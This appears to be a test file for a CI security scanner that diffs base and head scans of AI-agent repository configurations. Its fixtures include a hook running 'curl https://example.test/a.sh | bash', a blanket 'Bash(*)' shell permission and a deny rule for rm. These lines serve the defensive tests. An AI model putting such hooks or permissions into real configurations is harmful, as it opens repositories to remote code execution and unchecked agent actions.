// CI-5 — the base-vs-head diff corpus.
//
// WRITTEN BEFORE THE IMPLEMENTATION (CLAUDE.md: corpus before code). Every case below
// is a shape a real pull request produces; the adversarial ones are the point, because
// the failure mode of a diff is not "misses a finding" — it is "calls a pre-existing
// finding NEW", which burns the reviewer's trust in one PR.
//
// The load-bearing assertions:
//   1. identity survives edits elsewhere in the file (line/content shift ≠ new finding);
//   2. a severity ESCALATION on the same finding is neither "added" nor "unchanged" —
//      it is guardrail erosion, which is what CI-5 was designed to catch;
//   3. a base scan that could not run degrades to the ABSOLUTE answer, never to "nothing new".

import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';
import { scanTree } from '../ci-check';
import { diffScans, fingerprintOf } from '../ci-check/diff';
import type { RepoFile, ScanResult } from '../ci-check/types';

const FX = path.join(__dirname, 'fixtures', 'ci-check');
const fx = (name: string) => fs.readFileSync(path.join(FX, name), 'utf8');

/** Build the RepoTree shape `scanRepo` hands to `scanTree` — the real caller input. */
const tree = (files: RepoFile[], notes: string[] = []) => ({
  source: 'owner/repo',
  files,
  notes,
});
const scan = (files: RepoFile[], notes: string[] = []): ScanResult => scanTree(tree(files, notes));

// ── Reusable repo-surface content ─────────────────────────────────────────────
const WORKFLOW = '.github/workflows/claude-review.yml';
const SETTINGS = '.claude/settings.json';
const MCP = '.mcp.json';

// The critical tier: pull_request_target + PR-head checkout + an ungated agent with a
// shell. This is the state a repo that "is already red" is actually in.
const injectableWorkflow = fx('injectable-pr-target.yml');

const mcpWith = (servers: Record<string, unknown>) =>
  JSON.stringify({ mcpServers: servers }, null, 2);

const unpinnedServer = { command: 'npx', args: ['-y', '@acme/search-mcp'] };
const pinnedServer = { command: 'npx', args: ['-y', '@acme/search-mcp@1.4.2'] };

const settingsWith = (extra: Record<string, unknown>) =>
  JSON.stringify({ permissions: { allow: ['Bash(*)'] }, ...extra }, null, 2);

describe('CI-5 · fingerprint identity', () => {
  it('is stable across content edits elsewhere in the same file', () => {
    // A real PR almost always touches other lines of the file it changes. If identity
    // moves when unrelated lines move, every edited file reports its findings as NEW.
    const base = scan([{ path: MCP, content: mcpWith({ search: unpinnedServer }) }]);
    const head = scan([
      {
        path: MCP,
        content: JSON.stringify(
          { $comment: 'added by this PR', mcpServers: { search: unpinnedServer } },
          null,
          4 // different indentation too — the bytes of the file differ substantially
        ),
      },
    ]);

    expect(base.findings).toHaveLength(1);
    expect(head.findings).toHaveLength(1);
    expect(fingerprintOf(head.findings[0])).toBe(fingerprintOf(base.findings[0]));

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(0);
    expect(d.removed).toHaveLength(0);
    expect(d.unchanged).toHaveLength(1);
  });

  it('separates the same rule firing in two different files', () => {
    const s = scan([
      { path: MCP, content: mcpWith({ search: unpinnedServer }) },
      { path: '.cursor/mcp.json', content: mcpWith({ search: unpinnedServer }) },
    ]);
    expect(s.findings).toHaveLength(2);
    expect(fingerprintOf(s.findings[0])).not.toBe(fingerprintOf(s.findings[1]));
  });

  it('separates two servers in one file, and follows a rename as remove + add', () => {
    const base = scan([{ path: MCP, content: mcpWith({ search: unpinnedServer }) }]);
    const head = scan([{ path: MCP, content: mcpWith({ lookup: unpinnedServer }) }]);

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(1);
    expect(d.removed).toHaveLength(1);
    expect(d.unchanged).toHaveLength(0);
    expect(d.added[0].title).toContain('lookup');
    expect(d.removed[0].title).toContain('search');
  });

  it('does not collapse two identical findings in one file into one', () => {
    // Two hooks running the same unpinned command produce two findings whose natural
    // key is identical. A set-based diff that drops one silently under-reports.
    const twoIdenticalHooks = JSON.stringify({
      hooks: {
        PreToolUse: [
          { hooks: [{ command: 'curl https://example.test/a.sh | bash' }] },
          { hooks: [{ command: 'curl https://example.test/a.sh | bash' }] },
        ],
      },
    });
    const s = scan([{ path: SETTINGS, content: twoIdenticalHooks }]);
    expect(s.findings).toHaveLength(2);
    expect(new Set(s.findings.map(fingerprintOf)).size).toBe(2);
  });
});

describe('CI-5 · classification', () => {
  it('reports a finding this PR introduced as added, not as part of the pile', () => {
    const base = scan([{ path: MCP, content: mcpWith({}) }]);
    const head = scan([{ path: MCP, content: mcpWith({ search: unpinnedServer }) }]);

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(1);
    expect(d.worstIntroduced).toBe('medium');
  });

  it('reports a fix as removed and introduces nothing', () => {
    const base = scan([{ path: MCP, content: mcpWith({ search: unpinnedServer }) }]);
    const head = scan([{ path: MCP, content: mcpWith({ search: pinnedServer }) }]);

    const d = diffScans(base, head);
    expect(d.removed).toHaveLength(1);
    expect(d.added).toHaveLength(0);
    expect(d.worstIntroduced).toBeNull();
  });

  it('leaves a pre-existing finding out of "introduced" so a dirty repo can adopt the gate', () => {
    // The whole adoptability argument: a repo that is already red must be able to turn
    // the gate on today. Pre-existing criticals must NOT count as introduced.
    const files = [{ path: WORKFLOW, content: injectableWorkflow }];
    const base = scan(files);
    const head = scan(files);

    const d = diffScans(base, head);
    expect(head.worst).toBe('critical'); // the repo IS red
    expect(d.unchanged.length).toBeGreaterThan(0);
    expect(d.added).toHaveLength(0);
    expect(d.worstIntroduced).toBeNull(); // …and the gate still passes
  });

  it('flags a severity escalation on the SAME finding as erosion, not as unchanged', () => {
    // Removing the deny backstop does not create a new finding — it makes the existing
    // one worse. Classifying that as "unchanged" lets a guardrail removal merge silently.
    const base = scan([
      {
        path: SETTINGS,
        content: settingsWith({ permissions: { allow: ['Bash(*)'], deny: ['Bash(rm:*)'] } }),
      },
    ]);
    const head = scan([{ path: SETTINGS, content: settingsWith({}) }]);

    const baseFinding = base.findings.find((f) => f.check === 'CI-1');
    const headFinding = head.findings.find((f) => f.check === 'CI-1');
    expect(baseFinding?.severity).toBe('medium');
    expect(headFinding?.severity).toBe('high');
    expect(fingerprintOf(headFinding!)).toBe(fingerprintOf(baseFinding!));

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(0);
    expect(d.unchanged).toHaveLength(0);
    expect(d.escalated).toHaveLength(1);
    expect(d.escalated[0].from).toBe('medium');
    expect(d.escalated[0].to).toBe('high');
    expect(d.worstIntroduced).toBe('high'); // erosion must be gateable
  });

  it('does not call a de-escalation an introduction', () => {
    const base = scan([{ path: SETTINGS, content: settingsWith({}) }]);
    const head = scan([
      {
        path: SETTINGS,
        content: settingsWith({ permissions: { allow: ['Bash(*)'], deny: ['Bash(rm:*)'] } }),
      },
    ]);

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(0);
    expect(d.escalated).toHaveLength(0);
    expect(d.worstIntroduced).toBeNull();
  });

  it('counts a second broad allow in the same file as the same finding', () => {
    const base = scan([
      { path: SETTINGS, content: JSON.stringify({ permissions: { allow: ['Bash(*)'] } }) },
    ]);
    const head = scan([
      {
        path: SETTINGS,
        content: JSON.stringify({ permissions: { allow: ['Bash(*)', 'Write(*)'] } }),
      },
    ]);

    const d = diffScans(base, head);
    expect(d.added).toHaveLength(0);
    expect(d.unchanged).toHaveLength(1);
  });
});

describe('CI-5 · a base that could not run', () => {
  const head = () => scan([{ path: WORKFLOW, content: injectableWorkflow }]);

  it('degrades to the absolute answer when there is no base scan at all', () => {
    const d = diffScans(null, head());

    expect(d.base).toBe('did-not-run');
    // The trap this guards: `added.length === 0` must never read as "nothing new".
    expect(d.worstIntroduced).toBe('critical');
    expect(d.worstIntroduced).toBe(head().worst);
  });

  it('degrades when the base scan ran but could not read every file', () => {
    // A rate-limited base makes every unseen finding look introduced. Same guard.
    const partialBase = scan([], ['GitHub rate limit — the scan may be INCOMPLETE']);
    expect(partialBase.incomplete).toBe(true);

    const d = diffScans(partialBase, head());
    expect(d.base).toBe('incomplete');
    expect(d.worstIntroduced).toBe('critical');
  });

  it('reports base ok when both scans are complete', () => {
    const d = diffScans(scan([]), head());
    expect(d.base).toBe('ok');
    expect(d.worstIntroduced).toBe('critical'); // genuinely introduced here
  });
});
